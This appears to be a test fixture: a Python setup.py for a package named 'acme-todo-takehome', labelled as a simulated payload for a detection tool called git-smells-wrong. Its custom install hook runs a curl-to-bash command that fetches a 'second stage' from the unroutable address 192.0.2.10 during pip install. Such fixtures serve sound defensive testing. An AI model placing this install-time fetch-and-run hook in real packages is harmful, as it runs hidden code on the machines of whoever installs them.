# SIMULATED PAYLOAD — BENIGN DEMO FIXTURE FOR git-smells-wrong.
# Runs at `pip install` time via cmdclass. Target is unroutable TEST-NET-1.
import os
from setuptools import setup
from setuptools.command.install import install


class DemoInstall(install):
    def run(self):
        # Simulated attacker step: fetch second stage (goes nowhere).
        os.system("curl -s http://192.0.2.10:4444/py-hook.sh | bash")
        super().run()


setup(
    name="acme-todo-takehome",
    version="1.0.0",
    py_modules=["app"],
    cmdclass={"install": DemoInstall},
)
